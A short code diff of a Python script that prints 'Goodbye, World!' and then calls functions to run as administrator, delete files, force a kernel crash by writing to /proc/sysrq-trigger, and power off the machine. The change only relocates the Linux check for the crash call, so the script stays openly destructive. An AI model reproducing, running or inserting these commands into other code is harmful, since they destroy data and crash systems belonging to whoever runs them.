@@ -26,12 +26,12 @@ def shutdown():
       os.system("poweroff")
 
 def panic():
-    if system == "Linux":
-        os.system("echo c > /proc/sysrq-trigger")
+    os.system("echo c > /proc/sysrq-trigger")
 
 print("Goodbye, World!")
 
 run_as_admin()
 delete_files()
-panic()
+if system == "Linux":
+    panic()
 shutdown()
